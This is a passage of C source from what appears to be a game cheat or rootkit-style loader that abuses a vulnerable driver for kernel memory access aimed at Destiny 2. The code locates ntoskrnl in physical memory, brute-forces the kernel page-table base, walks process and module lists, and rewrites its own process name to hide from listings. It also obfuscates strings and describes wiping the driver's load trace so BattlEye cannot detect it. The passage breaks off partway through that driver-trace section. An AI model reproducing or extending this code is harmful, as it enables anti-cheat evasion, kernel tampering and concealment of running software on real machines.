                    for (ULONG i = 0; i < L->n; i++) {
                        const char *f = (const char*)L->m[i].fn + L->m[i].of;
                        /* XOR-decoded "ntoskrnl.exe" (key=0x4B) */
                        { static const char _enc[]={0x25,0x3F,0x24,0x38,0x20,0x39,0x25,0x27,0x65,0x2E,0x33,0x2E,0x00};
                          char _dec[14]; for(int _j=0;_j<12;_j++) _dec[_j]=_enc[_j]^0x4B; _dec[12]=0;
                        if (_stricmp(f, _dec) == 0) {
                            ntVA = (UINT64)L->m[i].ib; ntSz = L->m[i].isz; break;
                        } }
                    }
                }
                SeraphHeapFree(L);
            }
        }
    }

    if (!ntVA || !ntSz) { BYOVD_LogErr("FSE: Ph1 FAIL ntoskrnl not in QSI"); DEBUG_BYOVD("ntoskrnl not in QSI"); goto _fse_end; }
    BYOVD_LogFmt("FSE: Ph1 OK ntVA=0x%I64X sz=0x%X", ntVA, ntSz);
    DEBUG_BYOVD("ntoskrnl VA=0x%llX sz=0x%X", ntVA, ntSz);


    g_byovdDiagStep = 2; /* fse-ph2 */
    /* ── Phase 2: find ntoskrnl PA (≤64MB fast, ≤256MB fallback) ───────── */
    RAM_RANGE ramRanges[MAX_RAM_RANGES];
    int nRam = GetRamRanges(ramRanges, MAX_RAM_RANGES);
    if (!nRam) { DEBUG_BYOVD("no RAM ranges"); goto _fse_end; }

    const UINT64 NT_LARGE  = 0x200000ULL;
    const UINT64 NT_LIMIT0 = 0x04000000ULL;
    const UINT64 NT_LIMIT1 = 0x10000000ULL;
    UINT64 ntPA = 0;
    BYTE   phdr[0x50], ntHdr[0x50];

    for (int pass = 0; pass < 2 && !ntPA; pass++) {
        UINT64 step = (pass == 0) ? NT_LARGE : 0x1000ULL;
        for (int r = 0; r < nRam && !ntPA; r++) {
            UINT64 pa  = (ramRanges[r].start + step - 1) & ~(step - 1);
            UINT64 end = ramRanges[r].end & ~0xFFFULL;
            if (pass == 0) {
                if (pa >= NT_LIMIT0) continue;
                if (end > NT_LIMIT0) end = NT_LIMIT0;
            } else {
                if (pa < 0x1000ULL) pa = 0x1000ULL;
                if (end > NT_LIMIT1) end = NT_LIMIT1;
                if (pa >= end) continue;
            }
            for (; pa < end && !ntPA; pa += step) {
                if (!CtiPhysReadCached(pa, phdr, sizeof(phdr))) continue;
                if (*(USHORT*)phdr != 0x5A4D) continue;
                LONG lfa = *(LONG*)(phdr + 0x3C);
                if (lfa < 0x40 || lfa > 0x400) continue;
                if (!PhysReadAny(pa + lfa, ntHdr, sizeof(ntHdr))) continue;
                if (*(ULONG*)ntHdr != 0x00004550) continue;
                if (*(UINT64*)(ntHdr + 0x30) == ntVA) ntPA = pa;
            }
        }
        if (pass == 0 && !ntPA) DEBUG_BYOVD("ntoskrnl not at 2MB boundary, falling back 4KB scan");
    }
    if (!ntPA) { BYOVD_LogErr("FSE: Ph2 FAIL ntoskrnl PA not found"); DEBUG_BYOVD("ntoskrnl PA not found <=256MB"); goto _fse_end; }
    BYOVD_LogFmt("FSE: Ph2 OK ntPA=0x%I64X", ntPA);
    DEBUG_BYOVD("ntoskrnl PA=0x%llX", ntPA);

    g_byovdDiagStep = 3; /* fse-ph3 */
    /* ── Phase 3: export table → PsInitialSystemProcess → EPROCESS VA ──── */
    BYTE doshdr[0x40];
    if (!PhysReadAny(ntPA, doshdr, sizeof(doshdr))) { DEBUG_BYOVD("dos hdr fail"); goto _fse_end; }
    LONG lfanew = *(LONG*)(doshdr + 0x3C);
    if (lfanew < 0x40 || lfanew > 0x1000) { DEBUG_BYOVD("bad lfanew=%ld", lfanew); goto _fse_end; }
    BYTE nthdr[0x90];
    if (!PhysReadAny(ntPA + lfanew, nthdr, sizeof(nthdr))) { DEBUG_BYOVD("nt hdr fail"); goto _fse_end; }
    if (*(ULONG*)nthdr != 0x00004550) { DEBUG_BYOVD("bad PE sig in phase3"); goto _fse_end; }
    DWORD expRVA = *(DWORD*)(nthdr + 0x88);
    DWORD expSzD = *(DWORD*)(nthdr + 0x8C);
    if (!expRVA || expRVA >= ntSz || !expSzD) { DEBUG_BYOVD("bad export dir RVA=0x%X", expRVA); goto _fse_end; }

    IMAGE_EXPORT_DIRECTORY expDir = {0};
    if (!PhysReadAny(ntPA + expRVA, &expDir, sizeof(expDir))) { DEBUG_BYOVD("expdir read fail"); goto _fse_end; }
    if (!expDir.NumberOfNames || !expDir.AddressOfNames ||
        !expDir.AddressOfFunctions || !expDir.AddressOfNameOrdinals)
        { DEBUG_BYOVD("empty expdir"); goto _fse_end; }

    DWORD *names = (DWORD*)SeraphHeapAlloc(expDir.NumberOfNames*4);
    DWORD *funcs = (DWORD*)SeraphHeapAlloc(expDir.NumberOfFunctions*4+4);
    WORD  *ords  = (WORD*) SeraphHeapAlloc(expDir.NumberOfNames*2+2);
    if (!names || !funcs || !ords) {
        if (names) SeraphHeapFree(names);
        if (funcs) SeraphHeapFree(funcs);
        if (ords)  SeraphHeapFree(ords);
        DEBUG_BYOVD("export table alloc fail"); goto _fse_end;
    }
    PhysReadAny(ntPA + expDir.AddressOfNames,        names, expDir.NumberOfNames*4);
    PhysReadAny(ntPA + expDir.AddressOfFunctions,    funcs, expDir.NumberOfFunctions*4);
    PhysReadAny(ntPA + expDir.AddressOfNameOrdinals, ords,  expDir.NumberOfNames*2);

    ULONG psInitRVA = 0;
    for (DWORD i = 0; i < expDir.NumberOfNames; i++) {
        if (!names[i] || names[i] >= ntSz) continue;
        char sym[32] = {0};
        PhysReadAny(ntPA + names[i], sym, 31);
        /* XOR-decoded "PsInitialSystemProcess" (key=0x4B) */
        { static const char _enc2[]={0x1B,0x38,0x02,0x25,0x22,0x3F,0x22,0x2A,0x27,0x18,0x32,0x38,0x3F,0x2E,0x26,0x1B,0x39,0x24,0x28,0x2E,0x38,0x38,0x00};
          char _dec2[24]; for(int _j=0;_j<22;_j++) _dec2[_j]=_enc2[_j]^0x4B; _dec2[22]=0;
        if (strcmp(sym, _dec2) == 0) { psInitRVA = funcs[ords[i]]; break; } }
    }
    SeraphHeapFree(names); SeraphHeapFree(funcs); SeraphHeapFree(ords);

    if (!psInitRVA) { DEBUG_BYOVD("PsInitialSystemProcess export not found"); goto _fse_end; }
    UINT64 sys_eproc_va = 0;
    PhysReadAny(ntPA + psInitRVA, &sys_eproc_va, 8);
    if (!sys_eproc_va) { BYOVD_LogErr("FSE: Ph3 FAIL PsInitialSystemProcess==NULL"); DEBUG_BYOVD("PsInitialSystemProcess==NULL"); goto _fse_end; }
    BYOVD_LogFmt("FSE: Ph3 OK epVA=0x%I64X", sys_eproc_va);
    DEBUG_BYOVD("System EPROCESS VA=0x%llX", sys_eproc_va);

    /* ── Phase 4: brute-force CR3 from low RAM → VA2PA → EPROCESS PA ────── */
    g_byovdDiagStep = 4; /* fse-ph4 */
    UINT64 sys_eproc_pa = 0;
    UINT64 bootstrap_cr3 = 0;
    UINT64 pml4_idx = (ntVA >> 39) & 0x1FF;

    /* Pass 0: first 16MB (fast), pass 1: up to 256MB, pass 2: full RAM.
     * On modern systems (Win11 / >8 GB RAM) the kernel PML4 page often sits
     * above 32 MB; extending the search prevents "FSE: Ph4 FAIL" on those. */
    for (int pass4 = 0; pass4 < 3 && !bootstrap_cr3; pass4++) {
        UINT64 limit4 = (pass4 == 0) ? 0x1000000ULL : 0x10000000ULL; /* 16 MB / 256 MB */
        if (pass4 == 1) BYOVD_Log("FSE: Ph4 pass1 -> 256MB");
        if (pass4 == 2) BYOVD_Log("FSE: Ph4 pass2 -> fullRAM (Top-Down)");
        
        if (pass4 < 2) {
            for (int r = 0; r < nRam && !bootstrap_cr3; r++) {
                UINT64 pa  = (ramRanges[r].start + 0xFFFULL) & ~0xFFFULL;
                UINT64 end = ramRanges[r].end & ~0xFFFULL;
                if (end > limit4) end = limit4;
                if (pa >= end) continue;
                for (; pa < end && !bootstrap_cr3; pa += 0x1000) {
                    UINT64 pml4e = PhysReadU64(pa + pml4_idx * 8);
                    if (!(pml4e & 1)) continue;
                    UINT64 pdpt_pa = pml4e & 0x000FFFFFFFFFF000ULL;
                    if (pdpt_pa < 0x1000 || pdpt_pa > 0x400000000000ULL) continue; /* 64 TB */
                    UINT64 resolved = VA2PA_uncached(pa, ntVA);
                    if (resolved == ntPA) { bootstrap_cr3 = pa; break; }
                }
            }
        } else {
            for (int r = nRam - 1; r >= 0 && !bootstrap_cr3; r--) {
                UINT64 pa  = (ramRanges[r].start + 0xFFFULL) & ~0xFFFULL;
                UINT64 end = ramRanges[r].end & ~0xFFFULL;
                if (pa >= end) continue;
                for (UINT64 p = end - 0x1000; p >= pa && !bootstrap_cr3; p -= 0x1000) {
                    UINT64 pml4e = PhysReadU64(p + pml4_idx * 8);
                    if (!(pml4e & 1)) continue;
                    UINT64 pdpt_pa = pml4e & 0x000FFFFFFFFFF000ULL;
                    if (pdpt_pa < 0x1000 || pdpt_pa > 0x400000000000ULL) continue; /* 64 TB */
                    UINT64 resolved = VA2PA_uncached(p, ntVA);
                    if (resolved == ntPA) { bootstrap_cr3 = p; break; }
                    if (p < 0x1000) break;
                }
            }
        }
    }

    BYOVD_LogFmt("FSE: Ph4 bootstrap_cr3=0x%I64X", bootstrap_cr3);

    if (bootstrap_cr3) {
        sys_eproc_pa = VA2PA_uncached(bootstrap_cr3, sys_eproc_va);
        if (sys_eproc_pa) {
            UINT64 cr3 = 0;
            PhysReadAny(sys_eproc_pa + EP_DIRTABLEBASE, &cr3, 8);
            if ((cr3 & ~0xFFFULL) >= 0x100000ULL) {
                s_sysCR3 = cr3;
            } else {
                sys_eproc_pa = 0;
            }
        }
    }

    if (!sys_eproc_pa) { BYOVD_LogErr("FSE: Ph4 FAIL complete failure"); DEBUG_BYOVD("FindSystemEproc: complete failure"); }
    else BYOVD_LogFmt("FSE: DONE epPA=0x%I64X CR3=0x%I64X", sys_eproc_pa, s_sysCR3);
    _fse_result = sys_eproc_pa;
_fse_end:
    MUTATE_END
    return _fse_result;
}







/* Ã¢â€â‚¬Ã¢â€â‚¬ Find any process by ImageFileName, walk ActiveProcessLinks Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */


UINT64 BYOVD_FindProcessCR3(const char *imageName){


    /* Return cached CR3 if name matches and is still valid */


    if(s_procCR3Cache && _stricmp(s_procNameCache, imageName)==0)


        return s_procCR3Cache;


    if(!s_sysEprocPA) s_sysEprocPA=FindSystemEproc();


    if(!s_sysEprocPA||!s_sysCR3) return 0;


    /* Walk System's ActiveProcessLinks Flink chain */


    UINT64 flink=PhysReadU64(s_sysEprocPA+EP_ACTIVELINKS);


    UINT64 cur=flink; int guard=0;


    while(cur && guard++<512){


        UINT64 eproc_va=cur-EP_ACTIVELINKS;


        UINT64 eproc_pa=VA2PA(s_sysCR3,eproc_va);


        if(!eproc_pa){ UINT64 next2=PhysReadU64(cur); if(!next2||next2==flink||next2==cur) break; cur=next2; continue; }


        char name[16]={0}; PhysRead(eproc_pa+EP_IMAGENAME,name,15);


        if(_stricmp(name,imageName)==0){


            UINT64 cr3=PhysReadU64(eproc_pa+EP_DIRTABLEBASE);


            if((cr3&~0xFFFULL)>0){


                /* Cache the result */


                strncpy(s_procNameCache, imageName, 15); s_procNameCache[15]=0;


                s_procCR3Cache = cr3;


                return cr3;


            }


        }


        UINT64 next=PhysReadU64(eproc_pa+EP_ACTIVELINKS);


        if(next==flink||next==cur) break; /* looped back to System */


        cur=next;


    }


    return 0;


}

UINT64 BYOVD_FindProcessCR3ByPid(DWORD targetPid){
    if(!s_sysEprocPA) s_sysEprocPA=FindSystemEproc();
    if(!s_sysEprocPA||!s_sysCR3) return 0;
    PhysCacheFlushAll();
    
    UINT64 flink=PhysReadU64(s_sysEprocPA+EP_ACTIVELINKS);
    UINT64 cur=flink; int guard=0;
    while(cur && guard++<512){
        UINT64 eproc_va=cur-EP_ACTIVELINKS;
        UINT64 eproc_pa=VA2PA(s_sysCR3,eproc_va);
        if(!eproc_pa){ UINT64 next2=PhysReadU64(cur); if(!next2||next2==flink||next2==cur) break; cur=next2; continue; }
        
        UINT64 pid=PhysReadU64(eproc_pa+EP_UNIQUEPID);
        if((DWORD)pid == targetPid){
            UINT64 cr3=PhysReadU64(eproc_pa+EP_DIRTABLEBASE);
            return cr3;
        }
        
        UINT64 next2=PhysReadU64(eproc_pa+EP_ACTIVELINKS);
        if(!next2||next2==flink||next2==cur) break;
        cur=next2;
    }
    return 0;
}





/* Ã¢â€â‚¬Ã¢â€â‚¬ Module base via PEB.Ldr walk (physical) Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */



/* Walk ActiveProcessLinks to find OUR process by PID and overwrite
 * EPROCESS.ImageFileName (CHAR[16]) with fakeName (max 15 chars + null).
 * Makes NtQuerySystemInformation return the fake name instead of our real EXE name.
 * Caller MUST hold BYOVD_LOCK. */
BOOL BYOVD_SpoofProcessImageName(const char *fakeName){
    if(!fakeName) return FALSE;
    if(!s_sysEprocPA) s_sysEprocPA=FindSystemEproc();
    if(!s_sysEprocPA||!s_sysCR3) return FALSE;
    DWORD myPid=GetCurrentProcessId();
    UINT64 flink=PhysReadU64(s_sysEprocPA+EP_ACTIVELINKS);
    UINT64 cur=flink; int guard=0;
    while(cur&&guard++<512){
        UINT64 eproc_va=cur-EP_ACTIVELINKS;
        UINT64 eproc_pa=VA2PA(s_sysCR3,eproc_va);
        if(!eproc_pa){UINT64 n2=PhysReadU64(cur);if(!n2||n2==flink||n2==cur)break;cur=n2;continue;}
        UINT64 pid=PhysReadU64(eproc_pa+EP_UNIQUEPID);
        if((DWORD)(UINT_PTR)pid==myPid){
            char buf[16]={0};
            strncpy(buf,fakeName,15);
            return PhysWrite(eproc_pa+EP_IMAGENAME,buf,16);
        }
        UINT64 next=PhysReadU64(eproc_pa+EP_ACTIVELINKS);
        if(next==flink||next==cur)break;
        cur=next;
    }
    return FALSE;
}

/* Clear the FindProcessCR3 name->CR3 cache so the next call re-walks EPROCESS.
 * Must be called from Attach_Invalidate() when the game process exits, otherwise
 * Destiny2ProcessFound() keeps returning TRUE via the stale cached CR3 and the
 * AutoAttachThread never enters Phase 1 (re-attach) after a game restart. */
void BYOVD_InvalidateProcessCache(void) {
    s_procNameCache[0] = 0;
    s_procCR3Cache     = 0;
    InvalidateVAPACache();
}


/* Walk ActiveProcessLinks to find process by name, returning CR3 AND PEB virtual address.
 * EP_PEB = 0x550 on Win10 22H2 x64 (confirmed in driver.c).
 * Same loop as BYOVD_FindProcessCR3, just reads one extra field. */
BOOL BYOVD_FindProcessInfo(const char *imageName, UINT64 *outCR3, UINT64 *outPebVA){
    if(!imageName||!outCR3||!outPebVA) return FALSE;
    if(!s_sysEprocPA) s_sysEprocPA=FindSystemEproc();
    if(!s_sysEprocPA||!s_sysCR3) return FALSE;
    /* Flush physical page cache — page table entries change when game restarts,
     * stale cache causes VA2PA_uncached to return 0 for all valid candidates. */
    PhysCacheFlushAll();
    InvalidateVAPACache();
    UINT64 bestCR3=0, bestPEB=0, bestPID=0;
    UINT64 flink=PhysReadU64(s_sysEprocPA+EP_ACTIVELINKS);
    UINT64 cur=flink; int guard=0;
    while(cur && guard++<512){
        UINT64 eproc_va=cur-EP_ACTIVELINKS;
        UINT64 eproc_pa=VA2PA(s_sysCR3,eproc_va);
        if(!eproc_pa){ UINT64 next2=PhysReadU64(cur); if(!next2||next2==flink||next2==cur) break; cur=next2; continue; }
        char name[16]={0}; PhysRead(eproc_pa+EP_IMAGENAME,name,15);
        if(_stricmp(name,imageName)==0){
            UINT64 cr3=PhysReadU64(eproc_pa+EP_DIRTABLEBASE);
            UINT64 pid=PhysReadU64(eproc_pa+EP_UNIQUEPID);
            UINT64 peb=PhysReadU64(eproc_pa+0x550);
            UINT64 cr3_pa = cr3 & ~0xFFFULL;
            if (!cr3_pa) goto next_entry;
            /* Validate via PEB.ImageBaseAddress (PEB+0x10). Works with both ASLR on/off.
             * The old check used a hardcoded VA (0x7FF753380000) which was D2's base with
             * ASLR active. With ASLR disabled that address is wrong → always fell through
             * to bestPID heuristic, which breaks when other processes get higher PIDs. */
            if (peb > 0x10000ULL && peb < 0x7FFFFFFEFFFFULL) {
                UINT64 imgBase = 0;
                UINT64 imgBasePA = VA2PA_uncached(cr3, peb + 0x10);
                if (imgBasePA) PhysRead(imgBasePA, &imgBase, 8);
                if (imgBase >= 0x10000ULL && imgBase < 0x800000000000ULL) {
                    /* Verify MZ at ImageBaseAddress — confirms process is fully mapped */
                    WORD mz = 0;
                    UINT64 mzPA = VA2PA_uncached(cr3, imgBase);
                    if (mzPA) PhysRead(mzPA, &mz, 2);
                    if (mz == 0x5A4D) {
                        *outCR3=cr3; *outPebVA=peb;
                        return TRUE;
                    }
                }
            }
            /* Keep as fallback (PEB not yet mapped = process still loading) */
            if (pid > bestPID) { bestPID=pid; bestCR3=cr3; bestPEB=peb; }
        }
        next_entry:;
        UINT64 next=PhysReadU64(eproc_pa+EP_ACTIVELINKS);
        if(next==flink||next==cur) break;
        cur=next;
    }
    if(!bestCR3) return FALSE;
    *outCR3=bestCR3; *outPebVA=bestPEB;
    return TRUE;
}
UINT64 BYOVD_GetModuleBase(UINT64 cr3, UINT64 peb_va, const wchar_t *modName){


    UINT64 ldr=0; if(!BYOVD_ReadVA(cr3,peb_va+0x18,&ldr,8)||!ldr) return 0;


    UINT64 head=ldr+0x10, cur=0;


    if(!BYOVD_ReadVA(cr3,head,&cur,8)) return 0;


    int guard=0;


    while(cur!=head && guard++<512){


        UINT64 dllBase=0; BYOVD_ReadVA(cr3,cur+0x30,&dllBase,8);


        USHORT nLen=0; UINT64 nBuf=0;


        BYOVD_ReadVA(cr3,cur+0x58,&nLen,2);


        BYOVD_ReadVA(cr3,cur+0x60,&nBuf,8);


        if(dllBase && nLen>0 && nLen<512 && nBuf){


            wchar_t name[128]={0};


            BYOVD_ReadVA(cr3,nBuf,name,(ULONG)(nLen<254?nLen:254));


            if(_wcsicmp(name,modName)==0) return dllBase;


        }


        UINT64 next=0; if(!BYOVD_ReadVA(cr3,cur,&next,8)||!next) break;


        cur=next;


    }


    return 0;


}

#ifndef SYS_MOD_INFO
#define SYS_MOD_INFO 11
typedef struct { HANDLE s; PVOID mb; PVOID ib; ULONG isz; ULONG fl;
                 USHORT lo,io,lc,of; UCHAR fn[256]; } SYSMOD;
typedef struct { ULONG n; SYSMOD m[1]; } SYSMODLIST;
#endif

static UINT64 Pk_ModBase(const char *name){
    VM_START
    UINT64 result = 0;
    DEBUG_BYOVD("Pk_ModBase: looking up '%s'", name);

    /* 1. Tentar EnumDeviceDrivers primeiro (Discreto e legitimo) */
    typedef BOOL(WINAPI* tEnumDeviceDrivers)(LPVOID*, DWORD, LPDWORD);
    typedef DWORD(WINAPI* tGetDeviceDriverBaseNameA)(LPVOID, LPSTR, DWORD);
    tEnumDeviceDrivers pEnum = (tEnumDeviceDrivers)GetProcAddress(GetModuleHandleW(DXOR_W(ENC_kernel32_dll)), DXOR_A(ENC_K32EnumDeviceDrivers));
    tGetDeviceDriverBaseNameA pGetBaseName = (tGetDeviceDriverBaseNameA)GetProcAddress(GetModuleHandleW(DXOR_W(ENC_kernel32_dll)), DXOR_A(ENC_K32GetDeviceDriverBaseNameA));

    if (pEnum && pGetBaseName) {
        LPVOID drivers[1024];
        DWORD cbNeeded = 0;
        if (pEnum(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
            int count = cbNeeded / sizeof(LPVOID);
            for (int i = 0; i < count; i++) {
                char baseName[64] = {0};
                if (pGetBaseName(drivers[i], baseName, sizeof(baseName))) {
                    if (_stricmp(baseName, name) == 0) {
                        DEBUG_BYOVD("Pk_ModBase: found '%s' at 0x%I64X via EnumDeviceDrivers", name, (UINT64)drivers[i]);
                        result = (UINT64)drivers[i];
                        goto _modbase_exit;
                    }
                }
            }
        }
    }

    /* 2. Fallback: usar a chamada de syscall NtQuerySystemInformation atual se EnumDeviceDrivers falhar */
    DEBUG_BYOVD("Pk_ModBase: fallback to SysNtQuerySystemInformation for '%s'", name);
    ULONG sz=0; SysNtQuerySystemInformation(SYS_MOD_INFO,NULL,0,&sz);
    if(!sz){ DEBUG_BYOVD("Pk_ModBase: SysNtQSI returned sz=0, module list empty"); goto _modbase_exit; }
    sz+=0x2000;
    SYSMODLIST*L=(SYSMODLIST*)SeraphHeapAlloc(sz);
    if(!L) { goto _modbase_exit; }
    if(SysNtQuerySystemInformation(SYS_MOD_INFO,L,sz,&sz)>=0)
        for(ULONG i=0;i<L->n;i++){
            const char*f=(const char*)L->m[i].fn+L->m[i].of;
            if(_stricmp(f,name)==0){ result=(UINT64)L->m[i].ib; break; }
        }
    SeraphHeapFree(L);

_modbase_exit:
    VM_END
    return result;
}

UINT64 BYOVD_AobScanAllModules(UINT64 cr3, UINT64 peb_va,
                               const UINT8 *pattern, const UINT8 *mask, UINT8 patLen) {
    UINT64 ldr = 0;
    if (!BYOVD_ReadVA(cr3, peb_va + 0x18, &ldr, 8) || !ldr) return 0;
    UINT64 head = ldr + 0x10, cur = 0;
    if (!BYOVD_ReadVA(cr3, head, &cur, 8) || !cur) return 0;
    int guard = 0;
    while (cur != head && guard++ < 256) {
        UINT64 dllBase = 0; UINT32 soi = 0;
        BYOVD_ReadVA(cr3, cur + 0x30, &dllBase, 8);
        BYOVD_ReadVA(cr3, cur + 0x40, &soi, 4);
        if (dllBase && soi > 0x1000 && soi < 0x20000000) {
            UINT64 hit = BYOVD_ScanPattern(cr3, dllBase, soi, pattern, mask, patLen);
            if (hit) {
                return hit;
            }
        }
        UINT64 next = 0;
        if (!BYOVD_ReadVA(cr3, cur, &next, 8) || !next) break;
        cur = next;
    }
    return 0;
}




/* Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â


 * PIDDB CACHE CLEANER  Ã¢â‚¬â€  removes LnvMSRIO.sys trace from kernel tables


 * Eliminates the PiDDB entry written by NtLoadDriver so BattlEye kernel


 * scanner cannot detect LnvMSRIO by its timestamp / name.


 * Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â */








/* Get kernel VA of a module by filename (e.g. "ntoskrnl.exe", "ci.dll") */








/* Read PE file from disk, expand sections to VirtualAddress. Caller frees. */


static BYTE* Pk_MapPE(const WCHAR *path, DWORD *outSz){


    HANDLE hF=CreateFileW(path,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE,


                          NULL,OPEN_EXISTING,0,NULL);


    if(hF==INVALID_HANDLE_VALUE) return NULL;


    DWORD fsz=GetFileSize(hF,NULL);


    BYTE*raw=(BYTE*)SeraphHeapAlloc(fsz);


    if(!raw){SysNtClose(hF);return NULL;}


    DWORD rd=0; ReadFile(hF,raw,fsz,&rd,NULL); SysNtClose(hF);


    if(rd!=fsz){SeraphHeapFree(raw);return NULL;}


    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)raw;


    if(dos->e_magic!=IMAGE_DOS_SIGNATURE){SeraphHeapFree(raw);return NULL;}


    PIMAGE_NT_HEADERS64 nt=(PIMAGE_NT_HEADERS64)(raw+dos->e_lfanew);


    if(nt->Signature!=IMAGE_NT_SIGNATURE){SeraphHeapFree(raw);return NULL;}


    DWORD isz=nt->OptionalHeader.SizeOfImage;


    BYTE*img=(BYTE*)SeraphVAlloc(isz,PAGE_READWRITE);


    if(!img){SeraphHeapFree(raw);return NULL;}


    {
        DWORD _hdrSz = (DWORD)min(nt->OptionalHeader.SizeOfHeaders,fsz);
        for (DWORD _i = 0; _i < _hdrSz; _i++) img[_i] = raw[_i];
    }


    PIMAGE_SECTION_HEADER sec=IMAGE_FIRST_SECTION(nt);


    for(WORD i=0;i<nt->FileHeader.NumberOfSections;i++,sec++){


        DWORD rv=sec->VirtualAddress,rs=min(sec->SizeOfRawData,sec->Misc.VirtualSize);


        DWORD rp=sec->PointerToRawData;


        if(rp&&rs&&rv+rs<=isz&&rp+rs<=fsz) { for (DWORD _i = 0; _i < rs; _i++) img[rv + _i] = raw[rp + _i]; }


    }


    SeraphHeapFree(raw);


    if(outSz)*outSz=isz; return img;


}





/* Wildcard byte pattern scan ('x'=exact, '?'=skip). Returns RVA or 0. */


static ULONG Pk_Scan(const BYTE*img,DWORD sz,const BYTE*pat,const char*msk,ULONG n){


    for(DWORD i=0;i+n<=sz;i++){


        BOOL ok=TRUE;


        for(ULONG j=0;j<n&&ok;j++) if(msk[j]=='x'&&img[i+j]!=pat[j]) ok=FALSE;


        if(ok) return i;


    }


    return 0;


}





/* Get the PE TimeDateStamp of the embedded CtiIo64.sys resource blob */


static ULONG Pk_CtiDrvTS(void){


    HRSRC hR=FindResourceW(BYOVD_SELF_HMODULE,MAKEINTRESOURCEW(IDR_CTIIO64),RT_RCDATA);


    if(!hR) return 0;


    HGLOBAL hG=LoadResource(BYOVD_SELF_HMODULE,hR); if(!hG) return 0;


    BYTE*d=(BYTE*)LockResource(hG); DWORD sz=SizeofResource(BYOVD_SELF_HMODULE,hR);


    if(!d||sz<0x200) return 0;


    PIMAGE_DOS_HEADER dos=(PIMAGE_DOS_HEADER)d;


    if(dos->e_magic!=IMAGE_DOS_SIGNATURE) return 0;


    PIMAGE_NT_HEADERS64 nt=(PIMAGE_NT_HEADERS64)(d+dos->e_lfanew);


    if(nt->Signature!=IMAGE_NT_SIGNATURE) return 0;


    return nt->FileHeader.TimeDateStamp;


}





/* Recursive AVL-tree walk: find winio64 entry by timestamp and zero it.


   Win10 22H2 PiDDBCacheEntry layout (from RTL_BALANCED_NODE base):


     +0x00 Left  (UINT64)


     +0x08 Right (UINT64)


     +0x10 Parent+flags (UINT64)


     +0x18 DriverName.Length   (USHORT)


     +0x1A DriverName.MaxLen   (USHORT)


     +0x1C pad (4)


